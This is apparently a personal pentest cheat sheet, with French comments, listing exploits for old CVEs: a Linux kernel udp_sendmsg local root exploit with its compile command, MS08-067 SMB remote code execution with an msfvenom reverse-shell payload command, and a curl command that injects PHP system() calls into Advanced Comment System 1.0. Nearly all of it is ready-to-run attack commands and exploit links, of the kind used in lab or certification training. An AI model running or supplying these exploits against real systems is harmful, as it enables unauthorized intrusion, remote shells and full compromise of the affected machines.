# CVE

## Linux

#### CVE-2009-2698 (Linux Kernel < 2.6.19 (x86/x64) - 'udp\_sendmsg') - LPE - ROOT

```
https://github.com/xiaoxiaoleo/CVE-2009-2698 #Binaire
https://github.com/pythonmaster41/Go-For-OSCP/blob/master/Exploits/9545.c #Versions vulnérables
gcc -m32 -Wall -Wl,--hash-style=both 9542.c -o 9542 #Compilation (-m32 important)
```

## Windows

#### MS08-067 (SMB) - RCE - SYSTEM

```
https://github.com/Agent-Tiro/HackTheBoxScripts/blob/master/Python3-MS08-067.py
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86
python3 Python3-MS08-067.py <IP> 1 445 #Changer l'OS cible en modifiant le '1'
```

## WEB

#### CVE-2009-4623 (Advanced Comment System 1.0) - RCE

```
curl -s --data "<?system('<CMD>');?>" 'http://<IP>/internal/advanced_comment_system/admin.php?ACS_path=php://input%00'
```
